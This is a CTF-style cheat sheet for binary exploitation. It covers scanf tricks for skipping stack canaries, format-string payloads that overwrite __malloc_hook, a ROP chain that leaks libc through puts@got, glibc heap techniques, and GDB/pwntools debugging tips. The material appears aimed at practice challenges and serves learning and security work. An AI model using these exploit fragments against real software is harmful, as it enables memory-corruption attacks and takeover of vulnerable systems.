# printf/scanf tricks
```c
scanf("%lf", &n); // passing non number(. or -) yields to keeping the value stored in n
		  // [!] useful for bypassing stack canaries

for(i=0; i<n; i++) {
	scanf("%lf", &arr[i]); // %lf -> stack canary can be bypassed
	scanf("%d", &arr[i]);  // %d -> passing . or - terminates every scanf after
}

printf("hello\x00there"); // prints "hello"
			  // printf format string (first arg) terminates on nullbyte
			  // [!] something to keep in mind while exploiting format strings

printf("%100000c"); // triggers malloc

// printf can return -1 if an encoding error occurs
printf("%C", 'ͳʹ); // -1
printf("%c", 'ͳʹ); // PRINT
printf("%S", "ͳ ans T"); // -1
printf("%s", "ͳ and T"); // PRINT
```

# GDB/pwndbg/pwntools tricks
### Pwndbg print whole stack
```
stack
telescope ($rbp-$rsp)/8+1
```
### Print value
```
p user
```
### Print type/struct info
```
ptype user
```
### Print code around crash (or rip)
```
context code
```
### Running with custom libc without custom linker
If running from pwntools script setting LD_PRELOAD usually works
```python3
gs = '''
c
b *__libc_start_main+391
set $rax = main
<set other breakpoints here>
c
'''

io = gdb.debug(elf.path, gdbscript=gs, env={"LD_PRELOAD" : libc.path})
```
If first method fails you could set rpath to path that holds custom libc with patchelf
```
patchelf --set-rpath `pwd` <binary>
```
If the binary crashes in `__libc_start_main` before `call rax` you can break before the crash and manually set `rax` to the address of main
```
b *__libc_start_main+391
set $rax = main
```
### Debugging memory corruption
When getting `malloc.c no such file or directory` you can download corresponding malloc.c file from glibc source code and put it in the same directory. That way when you trigger security mitigation in malloc or free you can inspect the source code with `context code`. And dont forget to switch to the right frame before with `f <number>`.
### Tired of writing format string exploits?
Pwntools offers less painful alternative :)
https://docs.pwntools.com/en/stable/fmtstr.html
```python3
fmtstr_payload(8, {__malloc_hook : one_gadget}, write_size="byte")
```
### Find candidates for fake fastbin chunks
```
find_fake_fast addr
```
Where addr is the address of value to overlap.
### Parse memory as malloc chunk
```
malloc_chunk addr
```
Where addr is the address of chunk.
### Call another function from within GDB
```
call function()
```
Calls the function from gdb.
```
print function()
```
Calls the function from gdb and prints the return value.
### Buffering is wired while developing exploit?
```
context.log_level = 'debug'
```
I don't know how or why but it fixed pwntools halting on `recvuntil(b"keyword")`

# Leaking libc
This ropchain prints newline and then leaks address of puts from libc. The libc offset is then easily calculated by substracting puts offset from leaked address.
```python3
buf += p64(0x00000000004010a3) 		# pop rdi; ret; 
buf += p64(0x400020) 			# empty line to print -> points to start of .text section
buf += p64(elf.symbols["puts"]) 	# print newline
buf += p64(0x00000000004010a3) 		# pop rdi; ret; 
buf += p64(elf.got["puts"]) 		# rdi = *puts@got
buf += p64(elf.symbols["puts"])
buf += p64(0x000000000040063e) 		# ret; 
buf += p64(elf.symbols["fill"]) 	# call fill() (vulnerable function) for second stage
```
### Leak libc via unsorted bin
1. Craft a chunk of size 0x91 or bigger.
2. Make sure only PREV_INUSE flag is set.
3. Make sure the next chunk also has PREV_INUSE flag set.
4. Free the first chunk into unsorted bin.
### Not sure which libc version is on remote system?
Leak any libc function from .got table and check with https://libc.blukat.me/

Still not sure?
Leak more libc functions.
### Libc is shipped without symbols?
You can download version with symbols from https://launchpad.net/ubuntu/xenial/<libc_version> (ex. https://launchpad.net/ubuntu/xenial/amd64/libc6-dbg/2.23-0ubuntu5). Debug file to download is in format `libc6-dbg_<libc_version>.deb`. Then you can use tool eu-unstrip or extract the deb and replace challenge libc with libc with symbols.
### No shellcode, no ropchain? No problem
Use one_gadget https://github.com/david942j/one_gadget
to overwrite whatever address you can control execution with

# Glibc techniques summary
## House of Force
Overwrite `top_chunk` size and wrap around address space to control where the next chunk is allocated.
## Fastbin dup
Perform double free -> control the fd pointer in the last fastbin -> malloc returns address in fd pointer.
## House of Spirit
Craft fake chunk -> overwrite the pointer to free -> overwrite fd pointer -> malloc -> malloc -> write data.

# Other arch
## ARM
Getting started: https://azeria-labs.com/arm-lab-vm/

Currently `ROPgadget` has stronger gadget detection than `ropper` when it comes to ARM architecture

### Debugging ARM on x86 host.

Running the binary.
```
qemu-arm -g 1234 ret2win_armv5
```
Attaching to qemu with gdb-multiarch.
```
gdb-multiarch -q
gef-remote --qemu-user --qemu-binary ./ret2win_armv5 localhost 1234
```

### Pwntools script setup
```python
from pwn import *

context.arch = "arm"

elf = ELF("./ret2win_armv5")

gs = """
gef-remote --qemu-user --qemu-binary ./ret2win_armv5 localhost 1234
""" + "file " + elf.path

io = process(["qemu-arm","-g","1234", elf.path])
gdb.attach(io, gdbscript=gs)
...
```

# Adding symbols to stripped binary

### Manually
```
objcopy ./example --add-symbol main=.text:0xe2,function,global ./example-with-symbols
```
Where `0xe2` is offset of `main` from `.text` section.
The `--add-symbol` option may be specified multiple times.

https://naliferopoulos.github.io/ThinkingInBinary/symbolicating-stripped-elf-files-manually

### Export binary with symbols from ghidra
Add the following scripts into `Script Manager`.

https://github.com/nick0ve/syms2elf

# More tips
https://ropemporium.com/guide.html

https://github.com/Naetw/CTF-pwn-tips

https://fibonhack.it/resources/pwn
